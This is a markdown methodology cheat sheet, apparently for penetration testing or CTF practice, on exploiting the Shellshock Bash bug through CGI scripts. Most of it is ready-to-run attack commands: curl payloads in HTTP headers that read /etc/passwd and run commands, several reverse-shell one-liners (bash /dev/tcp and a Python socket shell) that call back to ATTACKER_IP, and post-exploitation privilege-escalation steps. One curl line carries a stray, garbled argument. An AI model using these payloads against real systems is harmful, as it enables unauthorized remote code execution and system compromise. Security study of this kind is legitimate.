# CGI / Shellshock (CVE-2014-6271) Methodology

## 1. Background

- **Shellshock** (CVE-2014-6271): vulnerability in GNU Bash ≤ 4.3
- Bash processes trailing commands after function definitions in environment variables
- CGI scripts pass HTTP headers as environment variables → RCE via crafted headers
- Affected: any CGI script executed by Bash (`.sh`, `.cgi`, `.pl` if invoked via Bash)

---

## 2. Discovery — Finding CGI Scripts

- [ ] Check for `/cgi-bin/` or `/CGI-bin/` directory
- [ ] Gobuster enumeration:
```bash
gobuster dir -u http://TARGET/cgi-bin/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/CGIs.txt \
  -x .sh,.cgi,.pl,.py
```
- [ ] Common CGI script names: `access.cgi`, `test.cgi`, `status.cgi`, `printenv.cgi`, `test-cgi`, `admin.cgi`
- [ ] Nmap script:
```bash
nmap -sV -p 80,443 --script=http-shellshock --script-args uri=/cgi-bin/access.cgi TARGET
```

---

## 3. Confirming Shellshock Vulnerability

### Test with `/etc/passwd` Read
```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' \
  bash -s :'' "http://TARGET/cgi-bin/access.cgi"
```

### Test with Command Execution
```bash
curl -H 'User-Agent: () { :; }; echo ; /usr/bin/id' \
  "http://TARGET/cgi-bin/access.cgi"
```

### Explanation of Payload
- `() { :; };` — defines an empty Bash function
- Everything after `};` is executed as a command
- The space and `echo` before the command ensures clean output
- Can inject via any HTTP header: User-Agent, Referer, Cookie, Accept, etc.

---

## 4. Exploitation — Reverse Shell

### Bash Reverse Shell
```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4443 0>&1' \
  "http://TARGET/cgi-bin/access.cgi"
```

### Alternative — Safer with `/bin/bash -c`
```bash
curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4443 0>&1"' \
  "http://TARGET/cgi-bin/access.cgi"
```

### Via Referer Header
```bash
curl -H 'Referer: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4443 0>&1' \
  "http://TARGET/cgi-bin/access.cgi"
```

### Python Reverse Shell (if Bash fails)
```bash
curl -H 'User-Agent: () { :; }; /usr/bin/python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"' \
  "http://TARGET/cgi-bin/access.cgi"
```

---

## 5. Other Injectable Headers

| Header | Example |
|--------|---------|
| User-Agent | Most common injection point |
| Referer | `Referer: () { :; }; <cmd>` |
| Cookie | `Cookie: () { :; }; <cmd>` |
| Accept | `Accept: () { :; }; <cmd>` |
| Accept-Language | Less commonly filtered |

---

## 6. Post-Exploitation

- [ ] Upgrade shell: `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- [ ] CGI typically runs as `www-data` or `apache` user
- [ ] Check sudo: `sudo -l`
- [ ] Look for kernel exploits: `uname -a`, `cat /etc/os-release`
- [ ] Check for password reuse in web app configs

---

## 7. Decision Tree

```
CGI Scripts Found (/cgi-bin/)
├── Enumerate scripts (Gobuster with CGIs.txt)
├── Test Shellshock: curl -H 'User-Agent: () { :; }; echo; /usr/bin/id'
│   ├── VULNERABLE → Bash reverse shell via User-Agent header
│   └── NOT VULNERABLE → check for other CGI vulns (command injection in params)
├── Catch reverse shell → www-data/apache user
└── Privesc: sudo -l, SUID, kernel exploits
```
